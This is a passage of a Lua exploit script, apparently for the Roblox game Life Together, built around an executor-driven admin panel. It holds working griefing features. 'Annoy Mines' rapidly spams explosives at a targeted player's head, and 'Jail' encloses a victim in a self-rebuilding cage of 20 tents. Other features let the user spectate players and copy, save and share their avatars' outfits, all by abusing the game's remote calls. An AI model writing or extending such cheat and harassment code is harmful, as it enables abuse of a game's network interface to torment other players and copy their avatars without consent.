                        -- Break immediately if you die or the target leaves/dies
                        if not tHead or not char or not bp then
                            g.activeAnnoyTarget = nil
                            AnnoyBtn.Text = "Annoy Mines"
                            AnnoyBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
                            break
                        end
                        
                        -- 🔥 THE OVERLAP TRICK: Runs the fetch and place inside its own thread
                        task.spawn(function()
                            if Send then Send("get_tool", "Explosive") end
                            
                            local newExp = bp:WaitForChild("Explosive", 0.15)
                            if newExp then
                                pcall(function()
                                    newExp.Parent = char
                                    
                                    -- SPAM PLACE: Spawns 8 mines instantly from one tool
                                    for i = 1, 8 do
                                        if Send then Send("place", tHead.Position, Vector3.new(0, 1, 0)) end
                                    end
                                    
                                    if Send then Send("delete_tool") end
                                    newExp:Destroy()
                                end)
                            end
                        end)
                        
                        task.wait(0.03) -- Micro-wait to aggressively spam threads without crashing
                    end
                end)
            end
        end)
            -- 5. 🪑 JAIL BUTTON (TIGHT BALL CAGE - NO ESCAPE)
        local JailBtn = Instance.new("TextButton")
        if g.activeJailTarget == targetPlayer then
            JailBtn.Text = "Un-Jail"
            JailBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        else
            JailBtn.Text = "Jail (Tent)"
            JailBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65) 
        end
        JailBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        JailBtn.Font = Enum.Font.SourceSansBold
        JailBtn.TextSize = 11
        JailBtn.BorderSizePixel = 0
        JailBtn.LayoutOrder = 13
        JailBtn.Parent = actionLayout 

        -- Helper functions for the Jail logic
        local function clearJail()
            local Send = g.Send or (g.g and g.g.Send)
            if not Send then return end
            
            local placed = workspace:FindFirstChild("PlacedModels") or workspace:FindFirstChild("ModelsPlaced")
            if placed then
                for _, model in ipairs(placed:GetChildren()) do
                    if model.Name == "Tent" then
                        local ownerId = model:GetAttribute("owner_id")
                        if tostring(ownerId) == tostring(myPlayer.UserId) then
                            local cd = model:FindFirstChildWhichIsA("ClickDetector", true) or Instance.new("ClickDetector")
                            Send("interaction", cd, "Pick Up")
                        end
                    end
                end
            end
        end

        local function spawnJail(tRoot)
            local Get = g.Get or (g.g and g.g.Get)
            local RS = game:GetService("ReplicatedStorage")
            local chairModel = RS:FindFirstChild("LargePlaceables") and RS.LargePlaceables:FindFirstChild("Tent")
            
            if not Get or not chairModel or not tRoot then return end
            
            local center = tRoot.Position
            g.jailCenter = center
            local targetCFrames = {}
            
            -- PERFECT TIGHT BALL (Fibonacci Sphere)
            local ballCenter = center + Vector3.new(0, 1, 0)
            local n = 20
            local phi = math.pi * (3 - math.sqrt(5)) 
            
            for i = 0, n - 1 do
                local y = 1 - (i / (n - 1)) * 2 
                local radiusAtY = math.sqrt(1 - y * y)
                local theta = phi * i
                
                local x = math.cos(theta) * radiusAtY
                local z = math.sin(theta) * radiusAtY
                
                -- 3.6 stud radius leaves absolutely NO space to jump or walk
                local offset = Vector3.new(x, y, z) * 3.6
                table.insert(targetCFrames, CFrame.new(ballCenter + offset, ballCenter))
            end
            
            -- Instant concurrent spawn
            for _, targetCFrame in ipairs(targetCFrames) do
                task.spawn(function()
                    Get("large_place", chairModel, targetCFrame)
                end)
            end
        end

        JailBtn.MouseButton1Click:Connect(function()
            if g.activeJailTarget == targetPlayer then
                g.activeJailTarget = nil
                JailBtn.Text = "Jail (Tent)"
                JailBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
                task.spawn(clearJail)
            else
                g.activeJailTarget = targetPlayer
                JailBtn.Text = "Un-Jail"
                JailBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
                
                task.spawn(function()
                    clearJail() 
                    task.wait(0.15)
                    
                    local initialRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if initialRoot then spawnJail(initialRoot) end
                    
                    while g.activeJailTarget == targetPlayer do
                        local tChar = targetPlayer.Character
                        local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
                        local myChar = myPlayer.Character
                        local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                        
                        if not tRoot or not myRoot then break end
                        
                        -- Target must be within 50 studs of you to maintain the jail
                        if (myRoot.Position - tRoot.Position).Magnitude <= 50 then
                            
                            -- MASSIVE ESCAPE CHECK (12 STUDS)
                            -- It will NEVER refresh the cage while they are bouncing around inside!
                            if not g.jailCenter or (tRoot.Position - g.jailCenter).Magnitude > 12 then
                                clearJail()
                                task.wait(0.15) 
                                
                                local myRootNow = myChar:FindFirstChild("HumanoidRootPart")
                                if g.activeJailTarget == targetPlayer and tRoot and myRootNow and (myRootNow.Position - tRoot.Position).Magnitude <= 50 then
                                    spawnJail(tRoot)
                                end
                            end
                            
                        else
                            -- Drop the cage if you teleport far away
                            if g.jailCenter then
                                clearJail()
                                g.jailCenter = nil 
                            end
                        end
                        
                        task.wait(0.1) 
                    end
                end)
            end
        end)
  
      -- LOGIC CONNECTIONS
        -- ==========================================
   
         targetRlBtn.MouseButton1Click:Connect(function()
            if autoRLTarget == targetPlayer then
                -- Turn it OFF
                autoRLTarget = nil
                targetRlBtn.Text = "Target RL"
                targetRlBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 50)
            else
                -- Turn it ON
                autoRLTarget = targetPlayer
                targetRlBtn.Text = "Untarget RL"
                targetRlBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
            end
        end)
----     
      tryShareBtn.MouseButton1Click:Connect(function()
          shareOutfitToAll(outfitData, tryShareBtn, "Share All", Color3.fromRGB(200, 100, 200), targetPlayer)
        end)

          -- [NEW CONNECTIONS FOR VIEW & WHITELIST]
        viewBtn.MouseButton1Click:Connect(function()
            if isViewing and selectedSpectateTarget == targetPlayer then
                -- If we are already viewing them, stop viewing and revert to blue
                stopView()
                viewBtn.Text = "View"
                viewBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 150)
            else
                -- If we are NOT viewing them, start viewing and turn red
                startView(targetPlayer)
                viewBtn.Text = "Unview"
                viewBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
            end
        end)

        wlBtn.MouseButton1Click:Connect(function()
            massWhitelist[targetPlayer.Name] = not massWhitelist[targetPlayer.Name]
            local nowWl = massWhitelist[targetPlayer.Name]
            wlBtn.Text = nowWl and "Safe" or "Whitelist"
            wlBtn.BackgroundColor3 = nowWl and Color3.fromRGB(40, 170, 90) or Color3.fromRGB(50, 50, 60)
        end)


        -- Action Connections
        copyBtn.MouseButton1Click:Connect(function()
            setclipboard(rawBox.Text)
            copyBtn.Text = "Copied!"
            task.wait(2)
            copyBtn.Text = "Copy JSON"
        end)

        saveBtn.MouseButton1Click:Connect(function()
            if writefile then
                local folder = "lifetogether_admin_savedoutfits"
                if makefolder and not isfolder(folder) then
                    pcall(makefolder, folder)
                end
                
                local baseName = targetPlayer.Name .. "_Scanned"
                local fileName = folder .. "/" .. baseName .. ".json"
                local counter = 1
                
                while isfile(fileName) do
                    fileName = folder .. "/" .. baseName .. "_" .. tostring(counter) .. ".json"
                    counter = counter + 1
                end

                local s, e = pcall(function()
                    writefile(fileName, rawBox.Text)
                end)
                if s then
                    saveBtn.Text = "Saved!"
                    saveBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
                else
                    saveBtn.Text = "Error Saving"
                    saveBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
                end
            else
                saveBtn.Text = "Not Supported"
                saveBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
            end
            task.wait(2)
            saveBtn.Text = "Save Outfit"
            saveBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        end)

        wearBtn.MouseButton1Click:Connect(function()
            local payload = buildBatchPayload(outfitData)
            local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
            local Get = getgenv().Get or (getgenv().g and getgenv().g.Get)

            if not Send then
                wearBtn.Text = "Loading Net..."
                wearBtn.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
                -- Silently fetch and execute the game's network API so this script runs standalone
             end

            if Send then
                wearBtn.Text = "Applying..."
                wearBtn.BackgroundColor3 = Color3.fromRGB(200, 200, 50)
                
                task.spawn(function()
                    for i = 1, 3 do
                        Send("wear_outfit_from_desc", payload)
                        task.wait(0.1)
                    end
                    task.wait(0.2)
                    
                    if outfitData.SkinTone then
                        pcall(function()
                            local c = Color3.new(outfitData.SkinTone[1], outfitData.SkinTone[2], outfitData.SkinTone[3])
                            for i = 1, 3 do Send("skin_tone", c) task.wait(0.1) end
                        end)
                        task.wait(0.2)
                    end
                    
                               --      if outfitData.Age and Get then
                     --   pcall(function()
                        --    Get("age", tostring(outfitData.Age)) 
                        --   end)
            
                   -- end

                    
                    if outfitData.HeightScale then
                        pcall(function()
                            for i = 1, 3 do Send("body_scale", "HeightScale", outfitData.HeightScale * 100) task.wait(0.1) end
                        end)
                    end
                    if outfitData.WidthScale then
                        pcall(function()
                            for i = 1, 3 do Send("body_scale", "WidthScale", outfitData.WidthScale * 100) task.wait(0.1) end
                        end)
                    end
------
                            if outfitData.BodyTypeScale then for i=1,3 do Send("body_scale", "BodyTypeScale", outfitData.BodyTypeScale * 100) task.wait(0.1) end end
if outfitData.ProportionScale then for i=1,3 do Send("body_scale", "ProportionScale", outfitData.ProportionScale * 100) task.wait(0.1) end end


                    wearBtn.Text = "Applied!"
                    wearBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
                    task.wait(2)
                    wearBtn.Text = "Try On (Server)"
                    wearBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
                end)
            else
                wearBtn.Text = "Net Error"
                wearBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
                task.wait(2)
                wearBtn.Text = "Try On (Server)"
                wearBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
            end
        end)
    end

    if description.Shirt ~= 0 then createDetailedAssetCard("Classic Shirt", description.Shirt, "HumanoidDesc.Shirt") end
    if description.Pants ~= 0 then createDetailedAssetCard("Classic Pants", description.Pants, "HumanoidDesc.Pants") end
    if description.GraphicTShirt ~= 0 then createDetailedAssetCard("T-Shirt Graphic", description.GraphicTShirt, "HumanoidDesc.GraphicTShirt") end
    if description.Face ~= 0 then createDetailedAssetCard("Face Texture", description.Face, "HumanoidDesc.Face") end

    local bodyParts = {
        "Head", "Torso", "LeftArm", "RightArm", "LeftLeg", "RightLeg"
    }
    for _, part in ipairs(bodyParts) do
        local partId = tonumber(description[part]) or 0
        if partId ~= 0 then
            createDetailedAssetCard("Body: " .. part, partId, "HumanoidDesc." .. part)
        end
    end

    local animations = {
        "IdleAnimation", "RunAnimation", "WalkAnimation", "JumpAnimation",
        "ClimbAnimation", "FallAnimation", "SwimAnimation"
    }
    for _, anim in ipairs(animations) do
        local animId = tonumber(description[anim]) or 0
        if animId ~= 0 then
            createDetailedAssetCard("Anim: " .. anim:gsub("Animation", ""), animId, "HumanoidDesc." .. anim)
        end
    end

    local accessories = description:GetAccessories(true)
    for _, acc in pairs(accessories) do
        local accType = tostring(acc.AccessoryType):gsub("Enum.AccessoryType.", "")
        local label = acc.IsLayered and ("Layered " .. accType) or accType
        createDetailedAssetCard(label, acc.AssetId, "HumanoidDesc." .. accType)
    end
end
---

-- ==========================================
-- SAVED OUTFIT DETAILED VIEW (OPENS WHEN CLICKED)
-- ==========================================
openSavedOutfitDetail = function(outfitInfo)
    isViewingSaved = true 
    local data, name, file = outfitInfo.data, outfitInfo.name, outfitInfo.file
    local folderName = "lifetogether_admin_savedoutfits"

    for _, child in pairs(AssetScroll:GetChildren()) do if child:IsA("Frame") then child:Destroy() end end
    
    Title.Text = "📁 Viewing: " .. name
    SavedScroll.Visible, SavedSearchBar.Visible, SavedPaginationBar.Visible = false, false, false
    AssetScroll.Visible, RefreshBtn.Visible, BackBtn.Visible = true, false, true

    local avatarFrame = Instance.new("Frame", AssetScroll)
    avatarFrame.Size, avatarFrame.BackgroundColor3, avatarFrame.BorderSizePixel = UDim2.new(1, -5, 0, 250), Color3.fromRGB(15, 15, 18), 1
    avatarFrame.BorderColor3, avatarFrame.LayoutOrder = Color3.fromRGB(0, 255, 150), 1

    local bigViewport = Instance.new("ViewportFrame", avatarFrame)
    bigViewport.Size, bigViewport.BackgroundTransparency = UDim2.new(1, 0, 1, 0), 1

    local worldModel = Instance.new("WorldModel", bigViewport)
    
    task.spawn(function()
        local desc = Instance.new("HumanoidDescription")
        desc.Shirt, desc.Pants, desc.GraphicTShirt = data.Shirt or 0, data.Pants or 0, data.GraphicTShirt or 0
        desc.Face, desc.Head = data.Face or 0, data.Head or 0
        
        desc.Torso, desc.LeftArm, desc.RightArm = data.Torso or 0, data.LeftArm or 0, data.RightArm or 0
        desc.LeftLeg, desc.RightLeg = data.LeftLeg or 0, data.RightLeg or 0

        if data.HeightScale then desc.HeightScale = data.HeightScale end
        if data.WidthScale then desc.WidthScale = data.WidthScale end
        if data.DepthScale then desc.DepthScale = data.DepthScale end
        if data.HeadScale then desc.HeadScale = data.HeadScale end
        if data.BodyTypeScale then desc.BodyTypeScale = data.BodyTypeScale end
        if data.ProportionScale then desc.ProportionScale = data.ProportionScale end
        
        if data.SkinTone then
            local c = Color3.new(data.SkinTone[1], data.SkinTone[2], data.SkinTone[3])
            desc.HeadColor, desc.TorsoColor, desc.LeftArmColor, desc.RightArmColor, desc.LeftLegColor, desc.RightLegColor = c, c, c, c, c, c
        end

        -- 🔥 FIX 1: Auto-sorts existing saved outfits so Layered Clothing wraps correctly!
        local layerOrderMap = { TShirt=1, Shirt=2, Pants=3, Shorts=4, DressSkirt=5, Sweater=6, Jacket=7, Hair=8, LeftShoe=9, RightShoe=10 }

        if data.Accessories then
            local layeredList, rigidGroups = {}, {}
            for _, acc in pairs(data.Accessories) do
                if acc.IsLayered then
                    pcall(function()
                        local tName = tostring(acc.AccessoryType):gsub("Enum.AccessoryType.", ""):gsub("Accessory", "")
                        local assignedOrder = tonumber(acc.Order)
                        if not assignedOrder or assignedOrder == 0 or assignedOrder == 1 then assignedOrder = layerOrderMap[tName] or 5 end
                        
                        table.insert(layeredList, {
                            AssetId = tonumber(acc.AssetId) or 0, AccessoryType = Enum.AccessoryType[tName] or Enum.AccessoryType.Unknown,
                            IsLayered = true, Order = assignedOrder, Puffiness = tonumber(acc.Puffiness) or 0
                        })
                    end)
                else
                    local tName = tostring(acc.AccessoryType):gsub("Enum.AccessoryType.", "")
                    if not string.find(tName, "Accessory") then tName = tName .. "Accessory" end
                    rigidGroups[tName] = rigidGroups[tName] and (rigidGroups[tName] .. "," .. tostring(acc.AssetId)) or tostring(acc.AssetId)
                end
            end
            
            for prop, val in pairs(rigidGroups) do pcall(function() desc[prop] = val end) end
            pcall(function() if #layeredList > 0 then desc:SetAccessories(layeredList, false) end end)
        end

        local dummy
        pcall(function() dummy = Players:CreateHumanoidModelFromDescription(desc, Enum.HumanoidRigType.R15) end)
        if not dummy then
            pcall(function()
                local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
                local oldArch = myChar.Archivable
                myChar.Archivable = true
                dummy = myChar:Clone()
                myChar.Archivable = oldArch
            end)
        end
        
        if dummy then
            -- 🔥 FIX 2: Anchor the dummy so it doesn't fall while wrapping the 3D clothes!
            local root = dummy:FindFirstChild("HumanoidRootPart") or dummy:FindFirstChild("Torso")
            if root then root.Anchored = true end
            
            dummy:PivotTo(CFrame.new(0, 50000, 0))
            dummy.Parent = workspace
            local hum = dummy:FindFirstChildOfClass("Humanoid")
            if hum then pcall(function() hum:ApplyDescription(desc) end) end
            
            task.wait(0.3) -- Give the engine time to perfectly wrap the meshes
            
            for _, v in pairs(dummy:GetDescendants()) do if v:IsA("Script") or v:IsA("LocalScript") then v:Destroy() end end
            dummy:PivotTo(CFrame.new(0, 0, 0))
            dummy.Parent = worldModel
            local camera = Instance.new("Camera", bigViewport)
            
            local hrp = dummy:FindFirstChild("HumanoidRootPart") or dummy:FindFirstChild("UpperTorso") or dummy:FindFirstChild("Torso")
            if hrp then
                camera.CFrame = hrp.CFrame * CFrame.new(0, 0.5, -7.5) * CFrame.Angles(0, math.pi, 0)
                camera.Focus = hrp.CFrame
            end
            bigViewport.CurrentCamera = camera
        end
    end)



    local actionFrame = Instance.new("Frame", AssetScroll)
    actionFrame.Size, actionFrame.BackgroundTransparency, actionFrame.LayoutOrder = UDim2.new(1, -5, 0, 95), 1, 2

    local RenameBox = Instance.new("TextBox", actionFrame)
    RenameBox.Size, RenameBox.Position = UDim2.new(1, -10, 0, 30), UDim2.new(0, 5, 0, 0)
    RenameBox.BackgroundColor3, RenameBox.TextColor3 = Color3.fromRGB(15, 15, 18), Color3.fromRGB(255, 255, 255)
    RenameBox.Font, RenameBox.TextSize, RenameBox.Text, RenameBox.ClearTextOnFocus = Enum.Font.SourceSansBold, 14, name, false
    Instance.new("UICorner", RenameBox).CornerRadius = UDim.new(0, 6)

    local actionLayout = Instance.new("Frame", actionFrame)
    actionLayout.Size, actionLayout.Position, actionLayout.BackgroundTransparency = UDim2.new(1, -10, 0, 60), UDim2.new(0, 5, 0, 35), 1

    local uigrid = Instance.new("UIGridLayout", actionLayout)
    uigrid.CellSize, uigrid.CellPadding = UDim2.new(0.235, 0, 0, 26), UDim2.new(0.02, 0, 0.08, 0)
    uigrid.SortOrder, uigrid.FillDirectionMaxCells = Enum.SortOrder.LayoutOrder, 4

    local WearBtn = Instance.new("TextButton", actionLayout)
    WearBtn.Text, WearBtn.BackgroundColor3, WearBtn.TextColor3 = "Wear", Color3.fromRGB(249, 180, 0), Color3.fromRGB(0, 0, 0)
    WearBtn.Font, WearBtn.TextSize, WearBtn.BorderSizePixel, WearBtn.LayoutOrder = Enum.Font.SourceSansBold, 11, 0, 1

    local RenameBtn = Instance.new("TextButton", actionLayout)
    RenameBtn.Text, RenameBtn.BackgroundColor3, RenameBtn.TextColor3 = "Rename", Color3.fromRGB(80, 80, 150), Color3.fromRGB(255, 255, 255)
    RenameBtn.Font, RenameBtn.TextSize, RenameBtn.BorderSizePixel, RenameBtn.LayoutOrder = Enum.Font.SourceSansBold, 11, 0, 2

    local DeleteBtn = Instance.new("TextButton", actionLayout)
    DeleteBtn.Text, DeleteBtn.BackgroundColor3, DeleteBtn.TextColor3 = "Delete", Color3.fromRGB(200, 50, 50), Color3.fromRGB(255, 255, 255)
    DeleteBtn.Font, DeleteBtn.TextSize, DeleteBtn.BorderSizePixel, DeleteBtn.LayoutOrder = Enum.Font.SourceSansBold, 11, 0, 3

    local ShareBtn = Instance.new("TextButton", actionLayout)
    ShareBtn.Text, ShareBtn.BackgroundColor3, ShareBtn.TextColor3 = "Share All", Color3.fromRGB(200, 100, 200), Color3.fromRGB(255, 255, 255)
    ShareBtn.Font, ShareBtn.TextSize, ShareBtn.BorderSizePixel, ShareBtn.LayoutOrder = Enum.Font.SourceSansBold, 11, 0, 4

    WearBtn.MouseButton1Click:Connect(function()
        WearBtn.Text = "..."
        local payload = buildBatchPayload(data)
        local Send, Get = getgenv().Send or (getgenv().g and getgenv().g.Send), getgenv().Get or (getgenv().g and getgenv().g.Get)
        if Send then
            task.spawn(function()
                for i = 1, 3 do Send("wear_outfit_from_desc", payload) task.wait(0.1) end
                task.wait(0.2)
                if data.SkinTone then pcall(function() local c = Color3.new(data.SkinTone[1], data.SkinTone[2], data.SkinTone[3]) for i = 1, 3 do Send("skin_tone", c) task.wait(0.1) end end) end
                if data.HeightScale then for i=1,3 do Send("body_scale", "HeightScale", data.HeightScale * 100) task.wait(0.1) end end
                if data.WidthScale then for i=1,3 do Send("body_scale", "WidthScale", data.WidthScale * 100) task.wait(0.1) end end
                if data.BodyTypeScale then for i=1,3 do Send("body_scale", "BodyTypeScale", data.BodyTypeScale * 100) task.wait(0.1) end end
                if data.ProportionScale then for i=1,3 do Send("body_scale", "ProportionScale", data.ProportionScale * 100) task.wait(0.1) end end
                WearBtn.Text = "Worn!"
                task.wait(1.5)
                WearBtn.Text = "Wear"
            end)
        end
    end)

    RenameBtn.MouseButton1Click:Connect(function() RenameBox:CaptureFocus() end)
    RenameBox.FocusLost:Connect(function()
        local newName = RenameBox.Text:gsub("%s+", "")
        if newName ~= "" and newName ~= name then
            local oldPath, newPath = folderName .. "/" .. name .. ".json", folderName .. "/" .. newName .. ".json"
            if not isfile(newPath) then
                pcall(function() writefile(newPath, HttpService:JSONEncode(data)) if isfile(oldPath) then delfile(oldPath) end end)
                name = newName
                Title.Text = "📁 Saved: " .. name
                populateSavedOutfits()
            end
        end
    end)

    DeleteBtn.MouseButton1Click:Connect(function()
        pcall(function() if isfile(file) then delfile(file) end end)
        populateSavedOutfits()
        BackBtn.MouseButton1Click:Fire() 
    end)

    ShareBtn.MouseButton1Click:Connect(function()
        local excludedTarget = nil
        for _, p in ipairs(Players:GetPlayers()) do if string.find(name, p.Name) then excludedTarget = p break end end
        shareOutfitToAll(data, ShareBtn, "Share All", Color3.fromRGB(200, 100, 200), excludedTarget)
    end)

    if data.Shirt and data.Shirt ~= 0 then createDetailedAssetCard("Classic Shirt", data.Shirt, "Saved.Shirt") end
    if data.Pants and data.Pants ~= 0 then createDetailedAssetCard("Classic Pants", data.Pants, "Saved.Pants") end
    if data.GraphicTShirt and data.GraphicTShirt ~= 0 then createDetailedAssetCard("T-Shirt Graphic", data.GraphicTShirt, "Saved.GraphicTShirt") end
    if data.Face and data.Face ~= 0 then createDetailedAssetCard("Face Texture", data.Face, "Saved.Face") end
    local bodyParts = {"Head", "Torso", "LeftArm", "RightArm", "LeftLeg", "RightLeg"}
    for _, part in ipairs(bodyParts) do local partId = tonumber(data[part]) or 0 if partId ~= 0 then createDetailedAssetCard("Body: " .. part, partId, "Saved." .. part) end end
    local animations = {"IdleAnimation", "RunAnimation", "WalkAnimation", "JumpAnimation", "ClimbAnimation", "FallAnimation", "SwimAnimation"}
    for _, anim in ipairs(animations) do local animId = tonumber(data[anim]) or 0 if animId ~= 0 then createDetailedAssetCard("Anim: " .. anim:gsub("Animation", ""), animId, "Saved." .. anim) end end
    if data.Accessories then
        for _, acc in pairs(data.Accessories) do
            local accType = tostring(acc.AccessoryType):gsub("Enum.AccessoryType.", "")
            createDetailedAssetCard(acc.IsLayered and ("Layered " .. accType) or accType, acc.AssetId, "Saved." .. accType)
        end
    end
end

-- ==========================================
-- PAGE RENDERER (ELIMINATES ALL LAG)
-- ==========================================
renderSavedPage = function()
    for _, child in pairs(SavedScroll:GetChildren()) do if child:IsA("TextButton") then child:Destroy() end end
    
    LblPage.Text = "Page " .. currentPage .. "/" .. totalPages
    
    local startIdx = (currentPage - 1) * itemsPerPage + 1
    local endIdx = math.min(currentPage * itemsPerPage, #allSavedOutfits)
    
    for i = startIdx, endIdx do
        local info = allSavedOutfits[i]
        local Entry = Instance.new("TextButton", SavedScroll)
        Entry.BackgroundColor3, Entry.BorderSizePixel, Entry.Text = Color3.fromRGB(24, 24, 30), 0, ""
        Instance.new("UICorner", Entry).CornerRadius = UDim.new(0, 8)

        local SmallViewport = Instance.new("ViewportFrame", Entry)
        SmallViewport.Name, SmallViewport.BackgroundColor3, SmallViewport.BorderSizePixel = "ViewportFrame", Color3.fromRGB(15, 15, 18), 0
        Instance.new("UICorner", SmallViewport).CornerRadius = UDim.new(0, 6)

        local smallWorldModel = Instance.new("WorldModel", SmallViewport)

   
           task.spawn(function()
            local desc = Instance.new("HumanoidDescription")
            local d = info.data
            desc.Shirt, desc.Pants, desc.GraphicTShirt = d.Shirt or 0, d.Pants or 0, d.GraphicTShirt or 0
            desc.Face, desc.Head = d.Face or 0, d.Head or 0
            
            desc.Torso, desc.LeftArm, desc.RightArm = d.Torso or 0, d.LeftArm or 0, d.RightArm or 0
            desc.LeftLeg, desc.RightLeg = d.LeftLeg or 0, d.RightLeg or 0

            if d.HeightScale then desc.HeightScale = d.HeightScale end
            if d.WidthScale then desc.WidthScale = d.WidthScale end
            if d.DepthScale then desc.DepthScale = d.DepthScale end
            if d.HeadScale then desc.HeadScale = d.HeadScale end
            if d.BodyTypeScale then desc.BodyTypeScale = d.BodyTypeScale end
            if d.ProportionScale then desc.ProportionScale = d.ProportionScale end

            if d.SkinTone then
                local c = Color3.new(d.SkinTone[1], d.SkinTone[2], d.SkinTone[3])
                desc.HeadColor, desc.TorsoColor, desc.LeftArmColor, desc.RightArmColor, desc.LeftLegColor, desc.RightLegColor = c, c, c, c, c, c
            end
            
            local layerOrderMap = { TShirt=1, Shirt=2, Pants=3, Shorts=4, DressSkirt=5, Sweater=6, Jacket=7, Hair=8, LeftShoe=9, RightShoe=10 }

            if d.Accessories then
                local layeredList, rigidGroups = {}, {}
                for _, acc in pairs(d.Accessories) do
                    if acc.IsLayered then
                        pcall(function()
                            local tName = tostring(acc.AccessoryType):gsub("Enum.AccessoryType.", ""):gsub("Accessory", "")
                            local assignedOrder = tonumber(acc.Order)
                            if not assignedOrder or assignedOrder == 0 or assignedOrder == 1 then assignedOrder = layerOrderMap[tName] or 5 end
                            
                            table.insert(layeredList, {
                                AssetId = tonumber(acc.AssetId) or 0, AccessoryType = Enum.AccessoryType[tName] or Enum.AccessoryType.Unknown,
                                IsLayered = true, Order = assignedOrder, Puffiness = tonumber(acc.Puffiness) or 0
                            })
                        end)
                    else
                        local tName = tostring(acc.AccessoryType):gsub("Enum.AccessoryType.", "")
                        if not string.find(tName, "Accessory") then tName = tName .. "Accessory" end
                        rigidGroups[tName] = rigidGroups[tName] and (rigidGroups[tName] .. "," .. tostring(acc.AssetId)) or tostring(acc.AssetId)
                    end
                end
                
                for prop, val in pairs(rigidGroups) do pcall(function() desc[prop] = val end) end
                pcall(function() if #layeredList > 0 then desc:SetAccessories(layeredList, false) end end)
            end

            local dummy
            pcall(function() dummy = Players:CreateHumanoidModelFromDescription(desc, Enum.HumanoidRigType.R15) end)
            if not dummy then
                pcall(function()
                    local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
                    local oldArch = myChar.Archivable
                    myChar.Archivable = true
                    dummy = myChar:Clone()
                    myChar.Archivable = oldArch
                end)
            end
            
            if dummy then
                local root = dummy:FindFirstChild("HumanoidRootPart") or dummy:FindFirstChild("Torso")
                if root then root.Anchored = true end 
                
                dummy:PivotTo(CFrame.new(0, 50000, 0))
                dummy.Parent = workspace
                local hum = dummy:FindFirstChildOfClass("Humanoid")
                if hum then pcall(function() hum:ApplyDescription(desc) end) end
                
                task.wait(0.3)
                
                for _, v in pairs(dummy:GetDescendants()) do if v:IsA("Script") or v:IsA("LocalScript") then v:Destroy() end end
                dummy:PivotTo(CFrame.new(0, 0, 0))
                dummy.Parent = smallWorldModel
                local camera = Instance.new("Camera", SmallViewport)
                
                local hrp = dummy:FindFirstChild("HumanoidRootPart") or dummy:FindFirstChild("UpperTorso") or dummy:FindFirstChild("Torso")
                if hrp then
                    camera.CFrame = hrp.CFrame * CFrame.new(0, 0.5, -6.5) * CFrame.Angles(0, math.pi, 0)
                    camera.Focus = hrp.CFrame
                end
                SmallViewport.CurrentCamera = camera
            end
        end)


        local NameBox = Instance.new("TextLabel", Entry)
        NameBox.Name, NameBox.BackgroundTransparency, NameBox.Text = "NameBox", 1, info.name
        NameBox.TextColor3 = info.isScanned and Color3.fromRGB(0, 255, 200) or Color3.fromRGB(255, 255, 255)
        NameBox.Font, NameBox.TextSize, NameBox.TextTruncate = Enum.Font.SourceSansBold, 12, Enum.TextTruncate.AtEnd
        
        if isSavedGridMode then
            SmallViewport.Size, SmallViewport.Position = UDim2.new(0, 60, 0, 60), UDim2.new(0.5, -30, 0, 5)
            NameBox.Size, NameBox.Position, NameBox.TextXAlignment = UDim2.new(1, -4, 0, 15), UDim2.new(0, 2, 0, 75), Enum.TextXAlignment.Center
        else
            SmallViewport.Size, SmallViewport.Position = UDim2.new(0, 40, 0, 40), UDim2.new(0, 5, 0, 5)
            NameBox.Size, NameBox.Position, NameBox.TextXAlignment = UDim2.new(1, -60, 0, 40), UDim2.new(0, 55, 0, 0), Enum.TextXAlignment.Left
        end
        
        Entry.MouseButton1Click:Connect(function() openSavedOutfitDetail(info) end)
    end
    
    task.delay(0.1, function()
        if SavedGrid and SavedScroll then SavedScroll.CanvasSize = UDim2.new(0, 0, 0, SavedGrid.AbsoluteContentSize.Y + 20) end
    end)
end

-- ==========================================
-- SAVED OUTFITS LIST BUILDER (DATA FETCHING & HEIGHT FILTER)
-- ==========================================
populateSavedOutfits = function()
    allSavedOutfits = {}
    local folderName = "lifetogether_admin_savedoutfits"
    if not isfolder or not isfolder(folderName) then return end

    for _, file in ipairs(listfiles(folderName)) do
        if file:match("%.json$") then
            local name = file:match("([^/\\]+)%.json$")
            local isScanned = (string.find(name, "_Scanned") ~= nil)
            
            local ok, content = pcall(readfile, file)
            if ok and content and #content > 0 then
                local success, data = pcall(function() return HttpService:JSONDecode(content) end)
                if success and type(data) == "table" then
                    -- 🔥 ADVANCED SEARCH LOGIC
                    if customOnly and isScanned then continue end
                    
                    local passSearch = true
                    if searchQuery ~= "" then
                        if string.sub(searchQuery, 1, 7) == "height:" then
                            -- Height Filter mode
                            local targetHeight = tonumber(string.sub(searchQuery, 8)) or 0
                            local fitHeight = tonumber(data.HeightScale) or 1
                            if fitHeight < targetHeight then passSearch = false end
                        else
                            -- Normal Name Search mode
                            if not string.find(string.lower(name), searchQuery) then passSearch = false end
                        end
                    end
                    
                    if passSearch then
                        table.insert(allSavedOutfits, {
                            name = name, data = data, file = file, isScanned = isScanned, time = tonumber(data.SavedAtTime) or 0
                        })
                    end
                end
            end
        end
    end

    table.sort(allSavedOutfits, function(a, b)
        if a.time ~= b.time then return a.time > b.time else return string.lower(a.name) < string.lower(b.name) end
    end)
    
    totalPages = math.ceil(#allSavedOutfits / itemsPerPage)
